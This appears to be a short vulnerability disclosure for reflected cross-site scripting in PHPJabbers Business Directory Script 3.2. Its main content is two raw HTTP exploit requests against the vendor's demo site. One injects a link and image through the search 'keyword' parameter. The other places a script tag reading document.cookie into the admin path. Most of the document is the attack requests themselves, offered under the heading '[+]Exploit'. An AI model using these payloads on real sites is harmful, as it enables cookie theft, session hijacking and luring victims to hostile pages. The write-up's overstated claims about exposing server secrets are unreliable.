## Business Directory Script-3.2

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/phpjabbers/2023/Business-Directory-Script-Version%3A3.2/docs/Screenshot%202023-08-24%20231243.png)

## Description:
The keyword parameter is vulnerable to XSS-Reflected.
The malicious user can inject a Java script into a search form and can find very sensitive information for the server,  and other dangerous things, it depends on the scenario. For example: the attacker can trick the victim into opening some very dangerous URL address.

STATUS: HIGH-CRITICAL Vulnerability

[+]Exploit:
```GET
GET /1692907137_587/preview.php?controller=pjListings&action=pjActionIndex&listing_search=1&keyword=%3Ca+href%3D%22https%3A%2F%2Fpornhub.com%2F%22+target%3D%22_blank%22+rel%3D%22noopener+nofollow+ugc%22%3E+%3Cimg+src%3D%22https%3A%2F%2Fth.bing.com%2Fth%2Fid%2FOIP.oiIYrhY78i7grK52ZoHsJAHaEH%3Fpid%3DImgDet%26rs%3D1%22+style%3D%22border%3A1px+solid+black%3Bmax-width%3A100%25%3B%22+alt%3D%22Photo+of+Byron+Bay%2C+one+of+Australia%27s+best+beaches%21%22%3E+%3C%2Fa%3E HTTP/1.1
Host: demo.phpjabbers.com
Cookie: YellowPages=slk3eokcgmdf0r3t7c020quv35; _ga=GA1.2.2069938240.1692907228; _gid=GA1.2.1275975650.1692907228; _fbp=fb.1.1692907228280.366290059; pjd=g0i8fch5jkebraaaf2812afvb5; _gat=1; _ga_NME5VTTGTT=GS1.2.1692907229.1.1.1692907579.60.0.0
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://demo.phpjabbers.com/1692907137_587/preview.php?controller=pjListings&action=pjActionIndex&listing_search=1&keyword=
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
[+]Admin login
```GET
GET /1692952621_330/index.php/eiu80"><script>alert(document.cookie)</script>k6erb?controller=pjAdmin&action=pjActionIndex HTTP/1.1
Host: demo.phpjabbers.com
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: _ga=GA1.2.282767338.1692957202; _gid=GA1.2.273232010.1692957202; _fbp=fb.1.1692957202789.1055564647; pjd=q13v3p8rtb34730t1gf9npvfp7; YellowPages=fkq0qc3nbvnfubjb6l710s0f83; _gat=1; _ga_NME5VTTGTT=GS1.2.1692957202.1.1.1692957951.57.0.0
Upgrade-Insecure-Requests: 1
Referer: http://fdceff01-e368-48a2-ba05-6d6380f3af6a.com/
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="116", "Chromium";v="116"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/phpjabbers/2023/Business-Directory-Script-Version%3A3.2)

## Proof and Exploit:
[href](https://www.nu11secur1ty.com/2023/08/business-directory-script-32-xss.html)

## Time spend:
00:05:00
